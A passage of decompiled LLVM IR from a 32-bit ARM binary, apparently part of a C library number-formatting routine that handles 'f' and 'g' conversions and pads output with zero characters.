bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_1986c = phi i32 [ %v0_1984c, %.thread16 ], [ %v0_1984c, %bb218 ], [ %v2_19858, %bb219 ]
  %v7_1985c = icmp eq i32 %v0_1985c, 102
  store i1 %v7_1985c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1985c, label %dec_label_pc_19868, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_1986c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19890

dec_label_pc_19868:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_1986c = add i32 %v0_1986c, %stack_var_-192.4
  store i32 %v2_1986c, i32* %ip.global-to-local, align 4
  %v8_19870 = icmp eq i32 %v2_1986c, -1
  store i1 %v8_19870, i1* %cpsr_z.global-to-local, align 1
  %v6_19874 = icmp slt i32 %v2_1986c, -1
  br i1 %v6_19874, label %dec_label_pc_19878, label %dec_label_pc_19890

dec_label_pc_19878:                               ; preds = %dec_label_pc_19868
  %v2_19878 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_19878, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_19884 = bitcast i32* %stack_var_-83 to i8*
  %v3_19884 = call i32 @__GI_memset(i8* %v2_19884, i32 48)
  store i32 %v3_19884, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19890

dec_label_pc_19890:                               ; preds = %bb221, %dec_label_pc_19868, %dec_label_pc_19878
  %v1_198d492 = phi i32 [ %v3_19884, %dec_label_pc_19878 ], [ %v2_1980c, %dec_label_pc_19868 ], [ %v2_1980c, %bb221 ]
  %v1_198b8 = phi i32 [ -1, %dec_label_pc_19878 ], [ %v2_1986c, %dec_label_pc_19868 ], [ %v0_1986c, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_19878 ], [ %stack_var_-192.4, %dec_label_pc_19868 ], [ %stack_var_-192.4, %bb221 ]
  %v1_19894 = add i32 %v1_198b8, -16
  %v3_19894 = sub i32 15, %v1_198b8
  %v4_19894 = and i32 %v3_19894, %v1_198b8
  %v5_19894 = icmp slt i32 %v4_19894, 0
  %v6_19894 = icmp slt i32 %v1_19894, 0
  %v7_19894 = icmp eq i32 %v1_198b8, 16
  store i1 %v7_19894, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_198a0 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_198a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_198a8 = xor i1 %v6_19894, %v5_19894
  %v4_198a8 = or i1 %v7_19894, %v3_198a8
  br i1 %v4_198a8, label %dec_label_pc_198b4, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_19890
  %v7_198a8137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_198a8137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_198b4:                               ; preds = %dec_label_pc_19890
  %v2_198b4 = ptrtoint i32* %stack_var_-82 to i32
  %v2_198b8 = add i32 %v1_198b8, %v2_198b4
  store i32 %v2_198b8, i32* %r3.global-to-local, align 4
  %v1_198bc = add i32 %v2_198b8, 2
  %v2_198bc = inttoptr i32 %v1_198bc to i8*
  %v3_198bc = load i8, i8* %v2_198bc, align 1
  %v4_198bc = zext i8 %v3_198bc to i32
  store i32 %v4_198bc, i32* %r2.global-to-local, align 4
  store i32 %v1_198bc, i32* %r1.global-to-local, align 4
  %v2_198c4 = icmp ugt i8 %v3_198bc, 51
  %v7_198c4 = icmp eq i8 %v3_198bc, 52
  store i1 %v7_198c4, i1* %cpsr_z.global-to-local, align 1
  %v2_198c8 = xor i1 %v2_198c4, true
  %v3_198c8 = or i1 %v7_198c4, %v2_198c8
  br i1 %v3_198c8, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_198b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_198b4, %bb222
  %v1_198d490 = phi i32 [ %v1_198d492, %dec_label_pc_198b4 ], [ 0, %bb222 ]
  %v2_198cc = xor i1 %v7_198c4, true
  %v3_198cc = and i1 %v2_198c4, %v2_198cc
  br i1 %v3_198cc, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_198d0 = phi i32 [ %v0_198d0.pre, %._crit_edge87 ], [ %v7_198a8137141, %.thread140 ], [ %v1_198bc, %bb223 ], [ %v1_198bc, %bb224 ]
  %v1_198d4 = phi i32 [ %v1_198d4.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_198d490, %bb223 ], [ 1, %bb224 ]
  %v1_198d0 = add i32 %v0_198d0, -1
  %v2_198d0 = inttoptr i32 %v1_198d0 to i8*
  %v3_198d0 = load i8, i8* %v2_198d0, align 1
  %v4_198d0 = zext i8 %v3_198d0 to i32
  store i32 %v1_198d0, i32* %r1.global-to-local, align 4
  %v2_198d4 = add i32 %v4_198d0, %v1_198d4
  %v1_198d8 = urem i32 %v2_198d4, 256
  store i32 %v1_198d8, i32* %r3.global-to-local, align 4
  %v2_198dc = icmp ugt i32 %v1_198d8, 56
  %v7_198dc = icmp eq i32 %v1_198d8, 57
  store i1 %v7_198dc, i1* %cpsr_z.global-to-local, align 1
  %v2_198e0 = xor i1 %v2_198dc, true
  %v3_198e0 = or i1 %v7_198dc, %v2_198e0
  br i1 %v3_198e0, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_198e4 = xor i1 %v7_198dc, true
  %v3_198e4 = and i1 %v2_198dc, %v2_198e4
  br i1 %v3_198e4, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_198ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_198ec = phi i32 [ %v1_198ec.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_198e8 = icmp eq i32 %v1_198d8, 48
  store i1 %v7_198e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_198e8, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_198ec = or i32 %v1_198ec, 1
  store i32 %v2_198ec, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_198f0 = phi i32 [ 1, %bb229 ], [ %v1_198ec, %bb228 ]
  %v2_198f0 = icmp eq i32 %v0_198f0, 0
  store i1 %v2_198f0, i1* %cpsr_z.global-to-local, align 1
  %v1_198f4 = trunc i32 %v2_198d4 to i8
  store i8 %v1_198f4, i8* %v2_198d0, align 1
  %v0_198f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_198f8, label %dec_label_pc_198fc, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_198d4.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_198d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_198fc:                               ; preds = %._crit_edge93
  store i32 %v2_198a0, i32* %r2.global-to-local, align 4
  %v2_19900 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_19900, i32* %r3.global-to-local, align 4
  %v0_19904 = load i32, i32* %r1.global-to-local, align 4
  %v3_19904 = icmp uge i32 %v0_19904, %v2_19900
  %v9_19904 = icmp eq i32 %v0_19904, %v2_19900
  store i1 %v9_19904, i1* %cpsr_z.global-to-local, align 1
  %v2_19908 = xor i1 %v3_19904, true
  %v3_19908 = or i1 %v9_19904, %v2_19908
  br i1 %v3_19908, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_198fc
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_19900, i32* %r2.global-to-local, align 4
  store i32 %v2_19900, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_198fc, %bb230
  %v2_19928 = phi i32 [ %v2_19900, %bb230 ], [ %v0_19904, %dec_label_pc_198fc ]
  %v4_1991c144 = phi i32 [ %v2_19900, %bb230 ], [ %v2_198a0, %dec_label_pc_198fc ]
  %v2_19914 = xor i1 %v9_19904, true
  %v3_19914 = and i1 %v3_19904, %v2_19914
  br i1 %v3_19914, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_19908, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_19918 = load i32, i32* @lr, align 4
  %v5_19918 = add i32 %v4_19918, 1
  store i32 %v5_19918, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_19914, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_1991c = add i32 %v4_1991c144, 2
  store i32 %v5_1991c, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19924 = load i32, i32* %sb.global-to-local, align 4
  %v7_19924 = icmp eq i32 %v0_19924, 103
  store i1 %v7_19924, i1* %cpsr_z.global-to-local, align 1
  %v3_19928 = add i32 %v2_19928, 1
  %v4_19928 = inttoptr i32 %v3_19928 to i8*
  store i8 0, i8* %v4_19928, align 1
  %v0_1992c = load i32, i32* %r1.global-to-local, align 4
  %v1_1992c = add i32 %v0_1992c, 1
  store i32 %v1_1992c, i32* %lr.global-to-local, align 4
  %v0_19930 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19930, label %dec_label_pc_19934, label %dec_label_pc_1995c

dec_label_pc_19934:                               ; preds = %bb236
  %v0_19934 = load i32, i32* %r0.global-to-local, align 4
  %v1_19934 = load i32, i32* %ip.global-to-local, align 4
  %v2_19934 = sub i32 %v0_19934, %v1_19934
  %v4_19934 = xor i32 %v1_19934, %v0_19934
  %v5_19934 = xor i32 %v2_19934, %v0_19934
  %v6_19934 = and i32 %v5_19934, %v4_19934
  %v7_19934 = icmp slt i32 %v6_19934, 0
  %v8_19934 = icmp slt i32 %v2_19934, 0
  %v9_19934 = icmp eq i32 %v0_19934, %v1_19934
  %v3_19938 = xor i1 %v8_19934, %v7_19934
  %v4_19938 = or i1 %v9_19934, %v3_19938
  %.258 = zext i1 %v4_19938 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_19940 = add i32 %v0_19934, 4
  %v3_19940 = sub i32 0, %v0_19934
  %v4_19940 = and i32 %v1_19940, %v3_19940
  %v5_19940 = icmp slt i32 %v4_19940, 0
  %v6_19940 = icmp slt i32 %v1_19940, 0
  %v7_19940 = icmp eq i32 %v1_19940, 0
  store i1 %v7_19940, i1* %cpsr_z.global-to-local, align 1
  %v2_19944 = xor i1 %v6_19940, %v5_19940
  br i1 %v2_19944, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_19934
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19c78

bb239:                                            ; preds = %dec_label_pc_19934
  %v2_19948 = icmp eq i1 %v4_19938, false
  store i1 %v2_19948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19948, label %dec_label_pc_19c78, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_1994c = sub i32 %v1_19934, %v0_19934
  store i32 %v3_1994c, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19968

dec_label_pc_1995c:                               ; preds = %bb236
  %v0_1995c = load i32, i32* %sb.global-to-local, align 4
  %v7_1995c = icmp eq i32 %v0_1995c, 102
  store i1 %v7_1995c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1995c, i32* %r8.global-to-local, align 4
  br i1 %v7_1995c, label %dec_label_pc_1995c.dec_label_pc_19968_crit_edge, label %dec_label_pc_19978

dec_label_pc_1995c.dec_label_pc_19968_crit_edge:  ; preds = %dec_label_pc_1995c
  %v0_19968.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19968

dec_label_pc_19968:                               ; preds = %.thread24, %dec_label_pc_1995c.dec_label_pc_19968_crit_edge
  %v0_19968 = phi i32 [ %v0_19968.pre, %dec_label_pc_1995c.dec_label_pc_19968_crit_edge ], [ %v0_19934, %.thread24 ]
  %v1_19968 = icmp slt i32 %v0_19968, 0
  %v2_19968 = icmp eq i32 %v0_19968, 0
  store i1 %v2_19968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19968, label %bb240, label %dec_label_pc_19978

bb240:                                            ; preds = %dec_label_pc_19968
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_19970 = load i32, i32* %r2.global-to-local, align 4
  %v6_19970 = add i32 %v5_19970, -1
  %v7_19970 = inttoptr i32 %v6_19970 to i8*
  store i8 48, i8* %v7_19970, align 1
  %v8_19970 = load i32, i32* %r2.global-to-local, align 4
  %v9_19970 = add i32 %v8_19970, -1
  store i32 %v9_19970, i32* %r2.global-to-local, align 4
  %v0_19974.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_199a8.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_19978

dec_label_pc_19978:                               ; preds = %bb240, %dec_label_pc_19968, %dec_label_pc_19c78, %dec_label_pc_1995c
  %v1_199a8 = phi i32 [ %v1_1992c, %dec_label_pc_1995c ], [ %v1_1992c, %dec_label_pc_19c78 ], [ %v1_199a8.pre.pre, %bb240 ], [ %v1_1992c, %dec_label_pc_19968 ]
  %v1_19a2030 = phi i32 [ 0, %dec_label_pc_1995c ], [ 0, %dec_label_pc_19c78 ], [ %v0_19974.pre, %bb240 ], [ %v0_19968, %dec_label_pc_19968 ]
  store i32 %v1_19a2030, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_19984 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_19984, i32* %r3.global-to-local, align 4
  %v0_19990 = load i32, i32* %r2.global-to-local, align 4
  %v1_19990 = inttoptr i32 %v0_19990 to i8*
  %v2_19990 = load i8, i8* %v1_19990, align 1
  %v3_19990 = zext i8 %v2_19990 to i32
  store i32 %v3_19990, i32* %r3.global-to-local, align 4
  %v5_19990 = add i32 %v0_19990, 1
  store i32 %v5_19990, i32* %r2.global-to-local, align 4
  %v1_19994 = icmp slt i32 %v1_19a2030, 0
  %v2_19994 = icmp eq i32 %v1_19a2030, 0
  store i1 %v2_19994, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_19990, i32* %r6.global-to-local, align 4
  store i32 %v3_19990, i32* %stack_var_-42, align 4
  %v2_199a8 = sub i32 %v1_199a8, %v5_19990
  store i32 %v2_199a8, i32* %ip.global-to-local, align 4
  br i1 %v1_19994, label %.thread, label %dec_label_pc_199b4

.thread:                                          ; preds = %dec_label_pc_19978
  %v5_199ac = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_199ac, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19a30

dec_label_pc_199b4:                               ; preds = %dec_label_pc_19978
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_199b8 = sub i32 %v1_19a2030, %v2_199a8
  %v4_199b8 = xor i32 %v2_199a8, %v1_19a2030
  %v5_199b8 = xor i32 %v2_199b8, %v1_19a2030
  %v6_199b8 = and i32 %v5_199b8, %v4_199b8
  %v7_199b8 = icmp slt i32 %v6_199b8, 0
  %v8_199b8 = icmp slt i32 %v2_199b8, 0
  %v9_199b8 = icmp eq i32 %v1_19a2030, %v2_199a8
  store i1 %v9_199b8, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_199c4 = xor i1 %v8_199b8, %v7_199b8
  br i1 %v2_199c4, label %dec_label_pc_19a10, label %dec_label_pc_199c8

dec_label_pc_199c8:                               ; preds = %dec_label_pc_199b4
  store i32 %v2_199b8, i32* %r2.global-to-local, align 4
  %v2_199cc = icmp eq i32 %v2_199b8, 0
  store i1 %v2_199cc, i1* %cpsr_z.global-to-local, align 1
  %v2_199d0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_199d0, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_199b8, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_199e4

.thread148:                                       ; preds = %dec_label_pc_199c8
  %v7_199d8 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_199d8, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_199e4:                               ; preds = %dec_label_pc_199c8
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v2_199f4 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_199f4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_19a30

dec_label_pc_19a10:                               ; preds = %dec_label_pc_199b4
  store i1 %v2_19994, i1* %cpsr_z.global-to-local, align 1
  %v2_19a14 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_19a14, i32* %lr.global-to-local, align 4
  br i1 %v2_19994, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_19a10
  %v3_19a1c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_19a1c, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_19a10
  %v3_19a20 = sub i32 %v2_199a8, %v1_19a2030
  store i32 %v3_19a20, i32* %ip.global-to-local, align 4
  %v3_19a2463 = add i32 %v5_19990, %v1_19a2030
  store i32 %v3_19a2463, i32* %r6.global-to-local, align 4
  %v3_19a28 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_19a28, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_19a70265 = phi i32 [ %v3_19a1c, %bb242 ], [ %v3_19a28, %bb243 ], [ %v7_199d8, %.thread148 ]
  %v0_19a44102 = phi i32 [ %v2_199a8, %bb242 ], [ %v3_19a20, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19a30

dec_label_pc_19a30:                               ; preds = %.thread, %dec_label_pc_199e4, %.thread34
  %v1_19a70 = phi i32 [ %v2_199f4, %dec_label_pc_199e4 ], [ %v1_19a70265, %.thread34 ], [ %v5_199ac, %.thread ]
  %v0_19a84109 = phi i32 [ -1, %dec_label_pc_199e4 ], [ -1, %.thread34 ], [ %v1_19a2030, %.thread ]
  %v0_19a44 = phi i32 [ 0, %dec_label_pc_199e4 ], [ %v0_19a44102, %.thread34 ], [ %v2_199a8, %.thread ]
  %v3_19a30 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19a30, i32* %r2.global-to-local, align 4
  %v1_19a34 = add i32 %v3_19a30, 12
  %v2_19a34 = inttoptr i32 %v1_19a34 to i32*
  %v3_19a34 = load i32, i32* %v2_19a34, align 4
  %v1_19a38 = and i32 %v3_19a34, 16
  store i32 %v1_19a38, i32* %r4.global-to-local, align 4
  %v2_19a38 = icmp eq i32 %v1_19a38, 0
  %tmp270 = zext i1 %v2_19a38 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_19a44 = icmp eq i32 %v0_19a44, 0
  store i1 %v2_19a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19a44, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_19a30
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19a60

bb246:                                            ; preds = %dec_label_pc_19a30
  store i1 %v2_19a38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19a38, label %dec_label_pc_19a54, label %dec_label_pc_19a60

dec_label_pc_19a54:                               ; preds = %bb246
  %v0_19a54 = load i32, i32* %sb.global-to-local, align 4
  %v7_19a54 = icmp eq i32 %v0_19a54, 103
  store i1 %v7_19a54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19a54, label %dec_label_pc_19a84, label %bb247

bb247:                                            ; preds = %dec_label_pc_19a54
  %v1_19a58 = load i32, i32* %fp.global-to-local, align 4
  %v3_19a58 = icmp eq i32 %v1_19a58, 0
  store i1 %v3_19a58, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_19a58, 1
  br i1 %tmp248, label %dec_label_pc_19a84, label %dec_label_pc_19a60

dec_label_pc_19a60:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33052), i32* %r3.global-to-local, align 4
  %v2_19a70 = inttoptr i32 %v1_19a70 to i32*
  store i32 112, i32* %v2_19a70, align 4
  %v0_19a74 = load i32, i32* %r3.global-to-local, align 4
  %v1_19a74 = add i32 %v0_19a74, 16
  store i32 %v1_19a74, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_19a7c = load i32, i32* %r7.global-to-local, align 4
  %v1_19a7c = add i32 %v0_19a7c, 4
  %v2_19a7c = inttoptr i32 %v1_19a7c to i32*
  store i32 1, i32* %v2_19a7c, align 4
  %v4_19a7c = add i32 %v0_19a7c, 8
  %v5_19a7c = inttoptr i32 %v4_19a7c to i32*
  %v6_19a7c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_19a7c, i32* %v5_19a7c, align 4
  %v0_19a80 = load i32, i32* %r7.global-to-local, align 4
  %v1_19a80 = add i32 %v0_19a80, 12
  store i32 %v1_19a80, i32* %r7.global-to-local, align 4
  %v0_19a84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19a84

dec_label_pc_19a84:                               ; preds = %dec_label_pc_19a54, %bb247, %dec_label_pc_19a60
  %v1_19aa4 = phi i32 [ %v1_19a70, %bb247 ], [ %v1_19a80, %dec_label_pc_19a60 ], [ %v1_19a70, %dec_label_pc_19a54 ]
  %v0_19a84 = phi i32 [ %v0_19a84109, %bb247 ], [ %v0_19a84.pre, %dec_label_pc_19a60 ], [ %v0_19a84109, %dec_label_pc_19a54 ]
  %v1_19a84 = add i32 %v0_19a84, 1
  store i32 %v1_19a84, i32* %lr.global-to-local, align 4
  %v6_19a84 = icmp slt i32 %v1_19a84, 0
  %v7_19a84 = icmp eq i32 %v1_19a84, 0
  store i1 %v7_19a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_19a84, label %dec_label_pc_19a8c, label %dec_label_pc_19ab0

dec_label_pc_19a8c:                               ; preds = %dec_label_pc_19a84
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v1_19a9c = sub i32 -1, %v0_19a84
  store i32 %v1_19a9c, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_19aa4 = inttoptr i32 %v1_19aa4 to i32*
  store i32 176, i32* %v2_19aa4, align 4
  %v0_19aa8 = load i32, i32* %r7.global-to-local, align 4
  %v1_19aa8 = add i32 %v0_19aa8, 4
  %v2_19aa8 = inttoptr i32 %v1_19aa8 to i32*
  %v3_19aa8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_19aa8, i32* %v2_19aa8, align 4
  %v4_19aa8 = add i32 %v0_19aa8, 8
  %v5_19aa8 = inttoptr i32 %v4_19aa8 to i32*
  %v6_19aa8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_19aa8, i32* %v5_19aa8, align 4
  %v0_19aac = load i32, i32* %r7.global-to-local, align 4
  %v1_19aac = add i32 %v0_19aac, 12
  store i32 %v1_19aac, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19ab0

dec_label_pc_19ab0:                               ; preds = %dec_label_pc_19a84, %dec_label_pc_19a8c
  %v2_19ab8 = phi i32 [ %v1_19aa4, %dec_label_pc_19a84 ], [ %v1_19aac, %dec_label_pc_19a8c ]
  %v0_19ab0 = load i32, i32* %ip.global-to-local, align 4
  %v2_19ab0 = icmp eq i32 %v0_19ab0, 0
  store i1 %v2_19ab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19ab0, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_19ab0
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_19ab8 = inttoptr i32 %v2_19ab8 to i32*
  store i32 112, i32* %v3_19ab8, align 4
  %v1_19abc = load i32, i32* %r6.global-to-local, align 4
  %v2_19abc = load i32, i32* %r7.global-to-local, align 4
  %v3_19abc = add i32 %v2_19abc, 8
  %v4_19abc = inttoptr i32 %v3_19abc to i32*
  store i32 %v1_19abc, i32* %v4_19abc, align 4
  %v1_19ac0 = load i32, i32* %ip.global-to-local, align 4
  %v2_19ac0 = load i32, i32* %r7.global-to-local, align 4
  %v3_19ac0 = add i32 %v2_19ac0, 4
  %v4_19ac0 = inttoptr i32 %v3_19ac0 to i32*
  store i32 %v1_19ac0, i32* %v4_19ac0, align 4
  %v1_19ac4 = load i32, i32* %r7.global-to-local, align 4
  %v2_19ac4 = add i32 %v1_19ac4, 12
  store i32 %v2_19ac4, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_19ab0, %bb249
  %v1_19afc = phi i32 [ %v2_19ab8, %dec_label_pc_19ab0 ], [ %v2_19ac4, %bb249 ]
  %v0_19ac8 = load i32, i32* %sb.global-to-local, align 4
  %v7_19ac8 = icmp eq i32 %v0_19ac8, 103
  store i1 %v7_19ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19ac8, label %dec_label_pc_19ad0, label %dec_label_pc_19ad8

dec_label_pc_19ad0:                               ; preds = %.thread46
  %v0_19ad0 = load i32, i32* %r4.global-to-local, align 4
  %v2_19ad0 = icmp eq i32 %v0_19ad0, 0
  store i1 %v2_19ad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19ad0, label %dec_label_pc_19b08, label %dec_label_pc_19ad8

dec_label_pc_19ad8:                               ; preds = %.thread46, %dec_label_pc_19ad0
  %v0_19ad8 = load i32, i32* %lr.global-to-local, align 4
  %v1_19ad8 = load i32, i32* %ip.global-to-local, align 4
  %v2_19ad8 = sub i32 %v1_19ad8, %v0_19ad8
  store i32 %v2_19ad8, i32* %r1.global-to-local, align 4
  %v1_19adc = load i32, i32* %fp.global-to-local, align 4
  %v2_19adc = sub i32 %v2_19ad8, %v1_19adc
  %v4_19adc = xor i32 %v1_19adc, %v2_19ad8
  %v5_19adc = xor i32 %v2_19adc, %v2_19ad8
  %v6_19adc = and i32 %v5_19adc, %v4_19adc
  %v7_19adc = icmp slt i32 %v6_19adc, 0
  %v8_19adc = icmp slt i32 %v2_19adc, 0
  %v9_19adc = icmp eq i32 %v2_19ad8, %v1_19adc
  store i1 %v9_19adc, i1* %cpsr_z.global-to-local, align 1
  %v2_19ae0 = xor i1 %v8_19adc, %v7_19adc
  br i1 %v2_19ae0, label %dec_label_pc_19ae4, label %dec_label_pc_19b08

dec_label_pc_19ae4:                               ; preds = %dec_label_pc_19ad8
  %v2_19af0 = sub i32 %v1_19adc, %v2_19ad8
  store i32 %v2_19af0, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_19afc = inttoptr i32 %v1_19afc to i32*
  store i32 176, i32* %v2_19afc, align 4
  %v0_19b00 = load i32, i32* %r7.global-to-local, align 4
  %v1_19b00 = add i32 %v0_19b00, 4
  %v2_19b00 = inttoptr i32 %v1_19b00 to i32*
  %v3_19b00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_19b00, i32* %v2_19b00, align 4
  %v4_19b00 = add i32 %v0_19b00, 8
  %v5_19b00 = inttoptr i32 %v4_19b00 to i32*
  %v6_19b00 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_19b00, i32* %v5_19b00, align 4
  %v0_19b04 = load i32, i32* %r7.global-to-local, align 4
  %v1_19b04 = add i32 %v0_19b04, 12
  store i32 %v1_19b04, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19b08

dec_label_pc_19b08:                               ; preds = %dec_label_pc_19ad8, %dec_label_pc_19ad0, %dec_label_pc_19ae4
  %v1_19b9c.pre.pre = phi i32 [ %v1_19afc, %dec_label_pc_19ad8 ], [ %v1_19afc, %dec_label_pc_19ad0 ], [ %v1_19b04, %dec_label_pc_19ae4 ]
  %v0_19b08 = load i32, i32* %r8.global-to-local, align 4
  %v7_19b08 = icmp eq i32 %v0_19b08, 102
